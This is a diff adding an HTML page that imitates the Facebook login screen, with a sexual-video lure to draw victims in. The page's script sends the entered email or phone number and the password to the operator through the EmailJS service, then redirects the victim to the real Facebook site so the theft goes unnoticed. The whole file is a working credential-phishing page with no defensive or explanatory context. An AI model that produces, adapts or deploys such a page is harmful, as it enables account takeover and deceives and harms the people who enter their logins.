@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
+   
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <img src="dav.jpg" width="50%" style="border-radius: 50%;">
+            <p>Log in your facebook to start watching my hot sexy videos.</p>
+        </div>
+        <div class="right">
+            <form id="form">
+
+     
+ 
+                <input type="search"  name="search" id="search" placeholder="Email addess or phone number"  required style="border-radius: none;">
+     
+
+
+ 
+ 
+                <input type="password"  name="password" id="password" placeholder="Password" 
+                required>
+
+
+
+              
+               <input class="loginBtn" type="submit" id="button" value="Log in" onclick="redirect()" >
+
+             
+            </form>
+            <p><b>Create a Page</b> for a celebrity, band or business.</p>
+        </div>
+    </div>
+<script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('SBq7bKpeB299tU3Mw')
+</script>
+<script type="text/javascript">
+const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'log in...';
+
+   const serviceID = 'default_service';
+   const templateID = 'template_f6izyur';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      window.location="https://www.facebook.com"
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
+
+</script>
+</body>
+</html>
